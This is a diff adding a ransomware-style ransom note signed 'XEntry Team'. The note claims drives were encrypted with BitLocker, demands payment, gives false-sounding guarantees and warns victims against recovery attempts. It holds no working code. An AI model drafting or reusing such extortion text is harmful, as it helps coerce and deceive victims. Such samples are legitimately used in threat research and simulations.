@@ -1,0 +1,18 @@
+========================================================
+              Hacked by XEntry Team
+========================================================
+
+Your network has been accessed and your critical drives
+have been encrypted using BitLocker. Your standard
+credentials will no longer log you in.
+
+To recover your data you must contact us and pay the fee.
+
+Our reputation is the guarantee that all content will be fulfilled.
+As a guarantee, we have no negative online reviews about non-fulfillment of our obligations.
+
+Do not attempt to remove BitLocker or restore from the
+recovery console. Any tampering will result in permanent
+loss of the recovery key.
+
+Contact instructions are printed on the attached page.
